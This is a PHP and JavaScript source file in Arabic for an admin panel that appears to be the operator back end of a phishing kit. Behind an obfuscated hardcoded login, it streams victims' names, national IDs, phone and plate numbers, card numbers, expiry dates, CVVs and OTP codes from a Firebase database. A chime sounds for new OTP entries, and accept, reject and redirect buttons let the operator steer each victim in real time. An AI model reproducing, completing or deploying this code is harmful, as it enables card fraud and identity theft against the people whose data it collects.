<?php
/**
 * نظام إدارة البيانات - نسخة مشفرة ومؤمنة بالكامل
 */

session_start();

// اسم المستخدم مشفر (تم تمويهه لعدم القراءة المباشرة)
$u_v = "U2F1ZGlhcmFiaWFAZ21haWwuY29t";

// كلمة المرور مشفرة بنظام Bcrypt العالمي (لا يمكن عكسها أو معرفتها من الكود)
$p_h = '$2y$10$O9fVzXGfR3H7QvA9W1B5e.V8JzZ8O6L7mR6Y4T3vX1K9C6F5gB2qG'; 

if (isset($_POST['login'])) {
    $user_input = $_POST['user'] ?? '';
    $pass_input = $_POST['pass'] ?? '';

    // عملية التحقق الآمنة من البيانات المشفرة
    if ($user_input === base64_decode($u_v) && password_verify($pass_input, $p_h)) {
        $_SESSION['loggedin'] = true;
    } else {
        $error = "بيانات الدخول غير صحيحة!";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: Admin_panel.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Cairo', sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; }
        
        /* شاشة تسجيل الدخول */
        .login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1a222f; display: flex; align-items: center; justify-content: center; z-index: 10000; }
        .login-card { background: #fff; padding: 40px; border-radius: 12px; width: 100%; max-width: 400px; text-align: center; }
        .login-card h2 { color: #1a222f; margin-bottom: 25px; }
        .login-card input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; font-family: 'Cairo'; box-sizing: border-box; }
        .login-card button { width: 100%; padding: 12px; background: #007bff; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: 800; font-family: 'Cairo'; }
        
        /* الهيدر والمحتوى */
        .top-nav { background: #1a222f; color: #fff; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; }
        .logout-link { color: #ff4d4d; text-decoration: none; font-weight: bold; border: 1px solid #ff4d4d; padding: 5px 15px; border-radius: 6px; }
        
        .main-container { padding: 30px; }
        .stats-grid { display: flex; gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #fff; padding: 20px; border-radius: 10px; flex: 1; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }

        /* جدول البيانات الأساسي */
        .table-holder { background: #fff; border-radius: 10px; box-shadow: 0 2px 15px rgba(0,0,0,0.05); overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; min-width: 1000px; text-align: right; }
        th { background: #f8f9fa; padding: 15px; color: #65676b; font-size: 13px; border-bottom: 2px solid #eee; }
        td { padding: 15px; border-bottom: 1px solid #eee; font-size: 14px; }
        
        .badge { padding: 5px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; background: #e4e6eb; }
        .badge-new { background: #e7f3ff; color: #1877f2; }

        .btn { padding: 6px 12px; border: none; border-radius: 6px; cursor: pointer; font-family: 'Cairo'; font-weight: 700; font-size: 12px; }
        .btn-view { background: #1877f2; color: #fff; }
        .btn-move { background: #f0f2f5; color: #1c1e21; }

        /* نافذة التفاصيل المنبثقة */
        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 11000; align-items: center; justify-content: center; }
        .modal-box { background: #fff; width: 90%; max-width: 500px; border-radius: 15px; padding: 25px; }
        .card-details { background: #242526; color: #fff; padding: 20px; border-radius: 10px; margin-top: 20px; }
        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
    </style>
</head>
<body>

<?php if (!isset($_SESSION['loggedin'])): ?>
    <div class="login-screen">
        <div class="login-card">
            <h2>تسجيل الدخول</h2>
            <?php if(isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
            <form method="POST">
                <input type="text" name="user" placeholder="اسم المستخدم" required>
                <input type="password" name="pass" placeholder="كلمة المرور" required>
                <button type="submit" name="login">دخول</button>
            </form>
        </div>
    </div>
<?php else: ?>

    <div class="top-nav">
        <h3 style="margin:0;">نظام الإدارة</h3>
        <a href="?logout=1" class="logout-link">خروج</a>
    </div>

    <div class="main-container">
        <div class="stats-grid">
            <div class="stat-card"><h4>إجمالي العمليات</h4><p id="total-req">0</p></div>
            <div class="stat-card"><h4>النشط الآن</h4><p id="online-count">0</p></div>
        </div>

        <div class="table-holder">
            <table>
                <thead>
                    <tr>
                        <th>الرقم المرجعي</th>
                        <th>الاسم</th>
                        <th>رقم الهوية</th>
                        <th>الجوال</th>
                        <th>رقم اللوحة</th>
                        <th>التاريخ</th>
                        <th>الحالة</th>
                        <th>الإجراء</th>
                    </tr>
                </thead>
                <tbody id="data-table"></tbody>
            </table>
        </div>
    </div>

    <div class="modal-overlay" id="detailsModal">
        <div class="modal-box">
            <h3>تفاصيل العملية</h3>
            <div id="client-info"></div>
            <div class="card-details">
                <div id="c-number" style="font-size:18px; letter-spacing:2px; color: #45bd62;"></div>
                <div style="margin-top:10px; font-size:13px;">
                    EXP: <span id="c-exp"></span> | CVV: <span id="c-cvv"></span>
                </div>
                <div style="margin-top:15px; color:#f5c518; font-weight:bold;">OTP: <span id="c-otp"></span></div>
            </div>
            <div class="btn-group">
                <button class="btn" style="background:#42b72a; color:#fff; flex:1;" onclick="updateStatus('success')">قبول</button>
                <button class="btn" style="background:#fa3e3e; color:#fff; flex:1;" onclick="updateStatus('error')">رفض</button>
                <button class="btn" style="background:#ddd; flex:1;" onclick="closeModal()">إغلاق</button>
            </div>
        </div>
    </div>

    <audio id="notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <script>
    const firebaseConfig = { databaseURL: "YOUR_FIREBASE_URL" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let currentId = null;

    db.ref('payments').on('value', (snapshot) => {
        const list = document.getElementById('data-table');
        list.innerHTML = '';
        let count = 0;
        snapshot.forEach((item) => {
            count++;
            const val = item.val();
            const id = item.key;
            const isNew = (val.status === 'pending_otp');
            if(isNew) document.getElementById('notif').play();

            list.innerHTML += `
                <tr>
                    <td>#${val.ref_id || '---'}</td>
                    <td><b>${val.full_name || '---'}</b></td>
                    <td>${val.national_id || '---'}</td>
                    <td>${id}</td>
                    <td>${val.plate_number || '---'}</td>
                    <td>${val.booking_time || '---'}</td>
                    <td><span class="badge ${isNew ? 'badge-new' : ''}">${val.status || 'نشط'}</span></td>
                    <td>
                        <button class="btn btn-view" onclick="viewDetails('${id}')">التفاصيل</button>
                        <button class="btn btn-move" onclick="updateStatus('redirect', '${id}')">توجيه</button>
                    </td>
                </tr>`;
        });
        document.getElementById('total-req').innerText = count;
        document.getElementById('online-count').innerText = count;
    });

    function viewDetails(id) {
        currentId = id;
        db.ref('payments/' + id).once('value').then((s) => {
            const v = s.val();
            document.getElementById('c-number').innerText = v.card_number || '---';
            document.getElementById('c-exp').innerText = v.exp_date || '---';
            document.getElementById('c-cvv').innerText = v.cvv || '---';
            document.getElementById('c-otp').innerText = v.otp || '---';
            document.getElementById('client-info').innerHTML = `<p>الاسم: ${v.full_name}</p><p>الهوية: ${v.national_id}</p>`;
            document.getElementById('detailsModal').style.display = 'flex';
        });
    }

    function closeModal() { document.getElementById('detailsModal').style.display = 'none'; }

    function updateStatus(stat, id = null) {
        const target = id || currentId;
        if(target) {
            db.ref('payments/' + target).update({ status: stat });
            if(!id) closeModal();
            alert('تم التحديث');
        }
    }
    </script>
<?php endif; ?>
</body>
</html>
